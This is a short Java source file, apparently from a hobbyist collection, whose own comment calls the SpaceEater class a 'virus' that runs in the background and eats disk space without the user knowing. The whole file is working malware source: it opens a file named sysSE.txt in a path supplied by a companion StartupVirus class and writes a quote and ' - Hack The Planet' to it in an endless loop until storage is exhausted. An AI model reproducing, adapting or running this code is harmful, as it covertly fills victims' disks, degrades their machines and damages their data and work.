import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

/**
 * Yet another classic "virus". Runs in the background and just eats up space on
 * your computer without you even knowing it.
 * 
 * @author Josias Sena
 */
public class SpaceEater {

	public static void main(String[] args) {
		try {
			File mFile = new File(StartupVirus.getPathToSetFile() + "\\sysSE.txt");
			FileWriter fileWriter = new FileWriter(mFile);
			BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);

			if (mFile.exists()) {
				mFile.setWritable(true);
				while (true) {
					bufferedWriter.write(
							"Most good programmers do " +
							"programming not because they expect to get " +
							"paid or get adulation by the public, " +
							"but because it is fun to program.");
					bufferedWriter.newLine();
					bufferedWriter.write(" - Hack The Planet");
					bufferedWriter.newLine();
				}
			}
			bufferedWriter.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
